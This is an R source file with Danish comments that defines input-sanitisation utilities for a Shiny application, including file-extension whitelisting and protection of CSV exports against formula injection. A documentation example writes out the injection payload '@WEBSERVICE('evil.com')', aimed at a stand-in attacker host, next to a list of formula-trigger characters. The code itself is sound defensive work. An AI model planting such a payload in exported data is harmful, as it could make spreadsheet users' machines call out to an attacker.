#' Input Sanitization Utilities
#'
#' Centraliseret sikkerhed for bruger input validation og sanitization.
#' Implementeret som del af security hardening efter tidyverse migration.
#'
#' @name input_sanitization
NULL

# sanitize_user_input er defineret i utils_export_validation.R
# (mere robust: fixed=TRUE, newline-preservering, javascript protocol removal)
# Fjernet duplikat med svagere implementation (se issue #102)

#' Sanitize Column Names
#'
#' Specialiseret sanitization for kolonne navne i SPC kontekst.
#' Tillader danske karakterer og standard kolonne navn patterns.
#'
#' @param column_name Column name at validere
#'
#' @return Sanitized column name suitable for R data.frame operations
#'
#' @examples
#' sanitize_column_name("Dato & tid") # Returns "Dato  tid"
#' sanitize_column_name("Y-værdi_1") # Returns "Y-værdi_1"
#'
#' @keywords internal
sanitize_column_name <- function(column_name) {
  sanitize_user_input(
    input_value = column_name,
    max_length = 100, # Kortere for kolonne navne
    allowed_chars = "A-Za-z0-9_æøåÆØÅ .-", # Tillad danske karakterer og common patterns
    html_escape = TRUE
  )
}

#' Validate and Sanitize File Extensions
#'
#' Sikker validation af file extensions med whitelist approach.
#'
#' @param file_ext File extension (med eller uden '.')
#' @param allowed_extensions Vector af tilladte extensions (default: CSV, Excel)
#'
#' @return TRUE hvis valid, FALSE hvis invalid eller potentielt malicious
#'
#' @examples
#' validate_file_extension("csv") # TRUE
#' validate_file_extension(".xlsx") # TRUE
#' validate_file_extension("exe") # FALSE
#'
#' @keywords internal
validate_file_extension <- function(file_ext, allowed_extensions = c("csv", "xlsx", "xls")) {
  if (is.null(file_ext) || length(file_ext) == 0) {
    return(FALSE)
  }

  # Normalize extension - fjern dots og convert til lowercase
  clean_ext <- gsub("^\\.", "", trimws(tolower(as.character(file_ext))))

  # Length check - undgå very long extensions
  if (nchar(clean_ext) > 10) {
    log_warn(
      message = "Suspicious file extension length detected",
      .context = "[FILE_VALIDATION]",
      details = list(extension = file_ext, length = nchar(clean_ext))
    )
    return(FALSE)
  }

  # Whitelist check
  is_valid <- clean_ext %in% allowed_extensions

  if (!is_valid) {
    log_warn(
      message = "Invalid file extension rejected",
      .context = "[FILE_VALIDATION]",
      details = list(
        attempted_extension = file_ext,
        allowed_extensions = allowed_extensions
      )
    )
  }

  return(is_valid)
}

#' Create Security Warning Message
#'
#' Standardiseret creation af sikkerhedsrelaterede warning messages til UI.
#'
#' @param field_name Navn på feltet der fejlede validation
#' @param issue_type Type af sikkerhedsproblem ("invalid_chars", "too_long", "invalid_format")
#' @param additional_info Ekstra information til brugeren
#'
#' @return Formatted warning message suitable for shiny UI
#'
#' @examples
#' create_security_warning("Kolonne navn", "invalid_chars")
#' create_security_warning("Fil navn", "too_long", "Maksimum 100 karakterer")
#'
#' @keywords internal
create_security_warning <- function(field_name, issue_type, additional_info = NULL) {
  # Sanitize field_name først for at undgå XSS i error messages
  safe_field_name <- sanitize_user_input(field_name, max_length = 50)

  base_message <- switch(issue_type,
    "invalid_chars" = paste0(safe_field_name, " indeholder ikke-tilladte karakterer"),
    "too_long" = paste0(safe_field_name, " er for langt"),
    "invalid_format" = paste0(safe_field_name, " har ugyldigt format"),
    "security_violation" = paste0("Sikkerhedsproblem med ", safe_field_name),
    paste0("Validation fejl i ", safe_field_name) # Default fallback
  )

  # Tilføj additional info hvis givet
  if (!is.null(additional_info) && nchar(additional_info) > 0) {
    safe_additional <- sanitize_user_input(additional_info, max_length = 200)
    base_message <- paste0(base_message, ". ", safe_additional)
  }

  return(base_message)
}

#' Sanitize CSV Output for Formula Injection Protection
#'
#' Sikrer at data eksporteret til CSV/Excel ikke kan eksekvere formler.
#' Forhindrer CSV injection attacks hvor formler som =SUM() eller @WEBSERVICE()
#' kan eksekveres når filen åbnes i Excel.
#'
#' @param data Data frame at sanitize for export
#'
#' @return Data frame med sanitized værdier
#'
#' @details
#' Karakterer der kan starte en formel i Excel:
#' - = (formula)
#' - + (addition formula)
#' - - (subtraction formula)
#' - @ (Excel 2010+ formula prefix)
#' - \\t (tab - kan bruges til command injection)
#' - \\r (carriage return - kan bruges til command injection)
#'
#' Løsning: Prefix med single quote (') for at tvinge text mode.
#'
#' @examples
#' \dontrun{
#' # Eksempel med farlige værdier
#' data <- data.frame(
#'   normal = c("test", "data"),
#'   dangerous = c("=SUM(A1:A10)", "@WEBSERVICE('evil.com')")
#' )
#'
#' safe_data <- sanitize_csv_output(data)
#' # dangerous kolonne bliver: c("'=SUM(A1:A10)", "'@WEBSERVICE('evil.com')")
#' }
#'
#' @keywords internal
sanitize_csv_output <- function(data) {
  if (!is.data.frame(data)) {
    stop("Input skal være en data frame")
  }

  # Karakterer der kan starte en formel i Excel
  formula_chars <- c("=", "+", "-", "@", "\t", "\r")

  # Sanitize alle character kolonner
  data <- data %>%
    dplyr::mutate(
      dplyr::across(
        dplyr::where(is.character),
        ~ {
          dplyr::if_else(
            # Check om første karakter er farlig
            !is.na(.x) & substr(.x, 1, 1) %in% formula_chars,
            paste0("'", .x), # Prefix med ' for at tvinge text mode
            .x # Bevar uændret hvis sikker
          )
        }
      )
    )

  return(data)
}
